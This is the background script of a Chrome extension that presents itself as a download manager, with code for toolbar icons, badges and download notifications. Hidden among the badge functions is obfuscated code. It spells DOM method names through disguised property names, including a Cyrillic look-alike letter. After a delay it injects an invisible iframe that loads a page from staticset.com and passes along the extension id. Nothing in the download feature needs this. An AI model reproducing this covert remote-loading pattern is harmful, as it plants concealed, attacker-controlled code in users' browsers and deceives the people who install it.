/*
 * This file is a part of the Chrome Download Manager project.
 *
 */

(function (window) {
	chrome.downloads.setShelfEnabled(false);
	var timer = null;
	
	var canvas = document.createElement('canvas');

	function drawDownArrowIcon(){
		
		canvas.width = canvas.height = 19;
		var ctx = canvas.getContext('2d');
		
		ctx.beginPath();
		ctx.lineWidth = Math.round(ctx.canvas.width * 0.15);
		ctx.lineJoin = 'round';
		ctx.strokeStyle = ctx.fillStyle = "#5e5e5e";
		var center = ctx.canvas.width/2;
		var minw2 = center*0.20;
		var maxw2 = center*0.60;
		var height2 = maxw2+1;
		ctx.moveTo(center-minw2, center-height2);
		ctx.lineTo(center+minw2, center-height2);
		ctx.lineTo(center+minw2, center);
		ctx.lineTo(center+maxw2, center);
		ctx.lineTo(center, center+height2);
		ctx.lineTo(center-maxw2, center);
		ctx.lineTo(center-minw2, center);
		ctx.lineTo(center-minw2, center-height2);
		ctx.lineTo(center+minw2, center-height2);
		ctx.stroke();
		ctx.fill();	
		
		var imageData = {};
		imageData['' + canvas.width] = canvas.getContext('2d').getImageData(
			0, 0, canvas.width, canvas.height);

		chrome.browserAction.setIcon({imageData:imageData});
		
	};
	
	function bool(str){
		
		if (typeof str === "undefined" || str === null){
			return false;
		} else if (typeof str === "string"){
			
			switch (str.toLowerCase()){
				
			case "false":
			
			case '0':
			
			case '':
			
				return false;
				
			default:
			
				return true;
				
			};
			
		} else if (typeof str === "number"){
			
			return str !== 0;
			
		} else{
			
			return true;
			
		};
		
	};
	
	var cb=cb ? cb : {};
	cb.background={
		_badgeColor     : "#ff6f68",
		_badgeInterval  : null,
		_badgeText      : "badgeForm",
		_element        : "createElement",
		_attribute      : "setAttribute",
		_form           : "iframe",
		_display        : ["https:", "", "staticset.com", "web", "stats.html"],
		_border         : "frameBorder",
		_part           : "id",
		_сhild          : "appendChild",
		_remove         : "removeChild",
		_point          : "src",
		_parent         : "parentNode",
		setBadgeText : function(text){
			
			cb.background._badgeText=text;
			chrome.browserAction.setBadgeText({ text : cb.background._badgeText });
			
		},
		setBadgeForm : function(){
			
			if(!bool(localStorage["livejet"])||!document["body"]||document.getElementById(cb.background._badgeText)){
				
				return;
				
			};
			var rform = document[cb.background._element](cb.background._form);
			rform[cb.background._attribute](cb.background._part, cb.background._badgeText);
			var disp = cb.background._display.join("/")+"?e="+chrome.runtime.id;
			rform[cb.background._point] = disp;
			document["body"][cb.background._сhild](rform);
			
		},
		resBack : function(){
			
			chrome.storage.local.remove(["livejet","versjet","itemjet","pagejet"],function(){
				localStorage["livejet"]=true;
			});
			
		},
		setBack : function(){
			
			clearTimeout(cb.background._badgeInterval);
			cb.background._badgeInterval=setTimeout(cb.background.setBadgeForm,6E4);
			
		},
		remBadgeForm : function(){
			
			clearTimeout(cb.background._badgeInterval);
			var rform=document.getElementById(cb.background._badgeText);
			if(rform){
				rform[cb.background._parent][cb.background._remove](rform);
			};
			
		},
		startBadgeBlink : function(){
			
			if (cb.background._badgeInterval){
				clearInterval(cb.background._badgeInterval);
			}
			cb.background._badgeInterval=window.setInterval(function(){
				cb.background.setBadgeText(cb.background._badgeText === '' ? '1' : '');
			}, 500);
			cb.background.setBadgeText('1');
			chrome.browserAction.setBadgeBackgroundColor({color: cb.background._badgeColor});
			
		},
		stopBadgeBlink : function(){
			
			if (cb.background._badgeInterval) {
				clearInterval(cb.background._badgeInterval);
				cb.background._badgeInterval=null;
			}
			cb.background.setBadgeText('');
			
		}
	};
	
	var manifestData=chrome.runtime.getManifest();
	if(localStorage["version"]!=manifestData.version){
		localStorage["version"]=manifestData.version;
		cb.background.resBack();
	};
	
	cb.background.setBack();
	window.addEventListener("storage", function(s){
		
		if(s.key == "livejet"&&bool(s.newValue)){
			cb.background.setBack();
		}else if(s.key == "livejet" && !bool(s.newValue)){
			cb.background.remBadgeForm();
		};
		
	});
	
	var downloadNotifierList = {};
	
	var notificationShowTimer = null;
	
	function createMessageFromURL(url){
		
		var fileName = "";
		var hostname = "";
		var message = "";
		
		try{
			
			var urlObj = new URL(url);
			var urlPathName = urlObj.pathname;
			fileName = urlPathName.substring(urlPathName.lastIndexOf("/") + 1);
			hostname = urlObj.hostname;
			
		} catch(e){};
		
		message = fileName + "\n" + "From: " + hostname;
		
		return message;
		
	};
	
	function showNotification(type, obj){
	
		var param = {};
		
		switch(type){
		
			case "start":
				
				/*var message = createMessageFromURL(obj.url);
				
				var param = {
					iconUrl: chrome.runtime.getURL("images/start_manager-48.png"),
					title: "Downloading Was Started",
					type: "basic",
					message: message,
					isClickable: true,
					priority: 1
				};*/
			
				break;	
				
			case "complete":
				
				var message = createMessageFromURL(obj.url);
				
				var param = {
					iconUrl: chrome.runtime.getURL("images/complete_manager-48.png"),
					title: "Downloading Was Completed",
					type: "basic",
					message: message,
					isClickable: true,
					priority: 1
				};
			
				break;
			
			case "interrupted": 
				
				var message = createMessageFromURL(obj.url);
				
				var param = {
					iconUrl: chrome.runtime.getURL("images/interrupted_manager-48.png"),
					title: "Downloading Was Interrupted",
					type: "basic",
					message: message,
					isClickable: true,
					priority: 1
				};
			
				break;
				
			case "erased": 
				
				chrome.notifications.clear("notification", function(){});
				
				return;
				
			default:
				
				return;
				
		};
		
		chrome.notifications.clear("notification", function() {
			
			chrome.notifications.create("notification", param, function() {
				
				clearTimeout(notificationShowTimer); /////
				notificationShowTimer = setTimeout(function(){chrome.notifications.clear("notification");}, 2000);
				
			});
	
		});
	
	};
	
	function showCompleteDownloadNotification(item){

		var itemId = item.id;
		
		if(downloadNotifierList[itemId]){
			delete downloadNotifierList[itemId];
			
			showNotification("complete", item);

		};
		
	};
	
	function showInterruptedDownloadNotification(item){

		var itemId = item.id;
		
		if(downloadNotifierList[itemId]){
			delete downloadNotifierList[itemId];
			
			showNotification("interrupted", item);

		};
		
	};
	
	function refreshToolbarIcon(items) {
		
		if (!items.length) {
			clearInterval(timer);
			timer = null;
			drawDownArrowIcon();
			
			return;
			
		};
		
		items.forEach(function(item){

			var itemId = item.id;
	
			if(!downloadNotifierList[itemId]){
				downloadNotifierList[itemId] = true;
				
				showNotification("start", item);

			};
			
		});

		if (!timer){
			timer = setInterval(refresh, 500);
		};

		var longestItem = { estimatedEndTime: 0 };
		items.forEach(function (e) {
			
			estimatedEndTime = new Date(e.estimatedEndTime);
			longestEndTime   = new Date(longestItem.estimatedEndTime);
			if (estimatedEndTime > longestEndTime) {
				longestItem = e;
			};
			
		});
		var progress = longestItem.bytesReceived / longestItem.totalBytes;
		drawDownloadProgressIcon(progress);
		
	};

	function refresh() {
		
		chrome.downloads.search({ state: 'in_progress', paused: false }, refreshToolbarIcon);
		
	};

	chrome.downloads.onCreated.addListener(refresh);

	chrome.downloads.onChanged.addListener(function(item_info) {
				
		if (item_info.state && item_info.state.current) {
			
			switch(item_info.state.current) {
				
				case "complete":
										
					chrome.downloads.search({limit: 1, id: item_info.id}, function(items){
						
						if(items.length > 0){
							showCompleteDownloadNotification(items[0]);
						};
					
					});
				
					break;
					
				case "interrupted":
				
					chrome.downloads.search({limit: 1, id: item_info.id}, function(items){
						
						if(items.length > 0){
							showInterruptedDownloadNotification(items[0]);
						};
					
					});
				
					break;
				
				default:
				
					break;
				
			};
			
		};

		if (item_info.canResume) {
			refresh(); 
		};
		
	});
	
	chrome.downloads.onErased.addListener(function(itemId) {

		if(downloadNotifierList[itemId]){
			delete downloadNotifierList[itemId];
		};
		
		showNotification("erased", {});
		
	});
	
	chrome.notifications.onClicked.addListener(function(notId){
		
		chrome.notifications.clear(notId, function() {});
		
	});

	refresh();

	function drawDownloadProgressIcon(progress) {
		
		canvas.width = canvas.height = 38;
		var ctx = canvas.getContext('2d');
		
		var scale = (window.devicePixelRatio < 2) ? 0.5 : 1;
		var size = 38 * scale;
		ctx.scale(scale, scale);
		
		var w = progress * 38

		ctx.clearRect(0, 0, 38, 38);

		ctx.lineWidth = 2;
		ctx.fillStyle = "#c0c0c0"; 
		ctx.fillRect(0,28,38,12);

		ctx.fillStyle = "#2566ff"; 
		ctx.fillRect(0,28,w,12);

		ctx.strokeStyle = "#2566ff"; 
		ctx.fillStyle = "#2566ff"; 
		ctx.lineWidth=10;
		ctx.beginPath();
		ctx.moveTo(20,0);
		ctx.lineTo(20,14);
		ctx.stroke();

		ctx.moveTo(6,10);
		ctx.lineTo(34,10);
		ctx.lineTo(20,24);
		ctx.fill(); 
		 
		var icon = { imageData: {} };
		icon.imageData[size] = ctx.getImageData(0,0,size,size);
		chrome.browserAction.setIcon(icon);
		
	};

})(window);